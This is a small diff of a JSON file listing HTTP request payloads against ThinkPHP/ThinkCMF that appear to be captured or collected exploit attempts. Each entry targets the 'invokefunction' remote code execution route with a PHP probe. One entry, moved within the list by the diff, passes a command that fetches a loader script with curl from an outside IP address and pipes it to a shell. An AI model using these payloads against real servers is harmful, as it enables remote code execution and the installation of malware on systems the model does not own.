@@ -12,16 +12,16 @@
   {
     "content": "<php>die(@md5(HelloThinkCMF))</php>",
     "s": "/Index/\\think\\app/invokefunction",
-    "vars_0_": "curl --user-agent curl_tp5 http://194.40.243.98/ldr.sh|sh"
-  },
-  {
-    "content": "<php>die(@md5(HelloThinkCMF))</php>",
-    "s": "/Index/\\think\\app/invokefunction",
     "vars_0_": "md5"
   },
   {
     "content": "<php>die(@md5(HelloThinkCMF))</php>",
     "s": "/Index/\\think\\app/invokefunction",
     "vars_0_": "__HelloThinkPHP"
+  },
+  {
+    "content": "<php>die(@md5(HelloThinkCMF))</php>",
+    "s": "/Index/\\think\\app/invokefunction",
+    "vars_0_": "curl --user-agent curl_tp5 http://194.40.243.98/ldr.sh|sh"
   }
 ]
